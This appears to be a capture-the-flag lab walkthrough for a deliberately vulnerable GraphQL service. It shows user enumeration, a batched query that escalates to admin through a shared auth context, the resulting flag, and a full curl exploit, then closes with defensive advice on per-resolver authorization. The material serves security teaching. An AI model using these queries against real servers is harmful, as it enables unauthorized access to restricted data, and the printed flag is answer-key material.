<!-- Introduction -->
<p>
    GraphQL batching allows sending multiple operations in a single HTTP request. In this lab,
    the server maintains a shared authentication context across operations within a batch.
    Querying an admin user "authenticates" the batch context as admin, and subsequent operations
    inherit that elevated privilege: allowing access to the restricted admin dashboard.
</p>

<h4>Step 1: Query Public Dashboard (No Auth)</h4>
<p>Without authentication, only the public dashboard is returned.</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Unauthenticated Access</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Query: </span>{ secretDashboard { id title content accessLevel } }<br>
        <span class="prompt">Result: </span>1 row returned<br><br>
        | id | title            | content                         | accessLevel |<br>
        |----|------------------|---------------------------------|-------------|<br>
        | 1  | Public Dashboard | Welcome to the public dashboard.| user        |
    </div>
</div>

<h4>Step 2: Discover Users and Roles</h4>
<p>Query user data to find an admin account.</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. User Enumeration</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Query: </span>{ user(id: 1) { id username role } }<br>
        <span class="prompt">Result: </span>{"id": 1, "username": "alice", "role": "user"}<br><br>
        <span class="prompt">Query: </span>{ user(id: 2) { id username role } }<br>
        <span class="prompt">Result: </span>{"id": 2, "username": "admin", "role": "<strong>admin</strong>"}
    </div>
</div>

<h4>Step 3: Batching Attack. Privilege Escalation</h4>
<p>
    The key vulnerability: querying <code>user(id: 2)</code> sets the batch authentication
    context to <code>admin</code>. When <code>secretDashboard</code> runs in the same batch,
    it checks the now-elevated context and returns admin-level data.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Batching Privilege Escalation</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Query (single HTTP request):</span><br>
        {<br>
        &nbsp;&nbsp;admin: user(id: 2) { id username role }<br>
        &nbsp;&nbsp;dashboard: secretDashboard { id title content accessLevel }<br>
        }<br><br>
        <span class="prompt">Response:</span><br>
        {<br>
        &nbsp;&nbsp;"data": {<br>
        &nbsp;&nbsp;&nbsp;&nbsp;"admin": {"id": 2, "username": "admin", "role": "admin"},<br>
        &nbsp;&nbsp;&nbsp;&nbsp;"dashboard": [<br>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{"id": 1, "title": "Public Dashboard", "content": "Welcome to the public dashboard.", "accessLevel": "user"},<br>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{"id": 2, "title": "Admin Secrets", "content": "<strong>FLAG{gq_b4tch1ng_4tt4ck}</strong>", "accessLevel": "admin"}<br>
        &nbsp;&nbsp;&nbsp;&nbsp;]<br>
        &nbsp;&nbsp;}<br>
        }
    </div>
</div>

<h4>Step 4: Verify the Difference</h4>
<p>Batching with a regular user does NOT return admin data: only the admin user triggers the escalation.</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Regular User (No Escalation)</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Query: </span>{ alice: user(id: 1) { role } dashboard: secretDashboard { id title content } }<br>
        <span class="prompt">Result: </span>alice.role="user", dashboard returns only Public Dashboard (1 row)
    </div>
</div>

<h4>Step 5: Submit the Flag</h4>
<p>
    Copy the flag from the admin dashboard entry: <code>FLAG{gq_b4tch1ng_4tt4ck}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -X POST http://target:4000/graphql/lab4 \<br>
        &nbsp;&nbsp;-H "Content-Type: application/json" \<br>
        &nbsp;&nbsp;-d '{"query":"{ admin: user(id: 2) { id role } dashboard: secretDashboard { id title content accessLevel } }"}'
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> GraphQL batching can cause privilege escalation when the server
    maintains a shared authentication context across operations in a single request. In this lab,
    querying <code>user(id: 2)</code> (admin) sets the batch auth context, and
    <code>secretDashboard</code> inherits it. This is a form of "confused deputy" where one
    operation's side effects affect another's authorization. Defense: each resolver must independently
    verify authorization from the HTTP request context (headers/tokens), not from a mutable shared
    state. Use per-resolver auth decorators like <code>@auth(role: "admin")</code>.
</div>
